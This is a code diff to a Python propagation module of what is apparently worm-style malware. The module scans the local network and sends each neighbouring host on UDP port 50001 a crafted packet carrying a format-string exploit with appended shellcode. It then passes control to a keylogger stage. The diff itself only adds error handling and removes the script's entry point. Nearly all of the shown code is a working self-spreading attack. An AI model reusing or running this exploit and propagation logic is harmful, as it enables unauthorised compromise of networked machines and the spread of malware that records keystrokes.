@@ -82,31 +82,27 @@ shellcode += b"\x31\xa4\x1f\xb6"
 
 def run():
     next_action = ""
-    data = ""
+    data = "no_data"
     print("[+] Propagation module activated...")
 
-    # try:
-    interface = get_interface()
-    network = get_network(interface)
-    port = 50001  # Define the port to scan
-    neighbors = net_scan(network)
-    print('Lets attack')
-    print('Brute all active Hosts on Port 50001')
-    
-    for ip in neighbors:
-        print(f'IP: {ip}')
-        p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.sendto(p, (ip, port))
-        s.close()
-            
-    # except Exception as e: 
-    #     print(e)
-    #     pass
-        # exit()
+    try:
+        interface = get_interface()
+        network = get_network(interface)
+        port = 50001
+        neighbors = net_scan(network)
+        print('Lets attack')
+        print('Brute all active Hosts on Port 50001')
+        
+        for ip in neighbors:
+            print(f'IP: {ip}')
+            p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.sendto(p, (ip, port))
+            s.close()
+                
+    except Exception as e: 
+            print(e)
+            pass
 
     next_action = "keylogger"
     return data, next_action
-
-if __name__ == '__main__':
-    run()
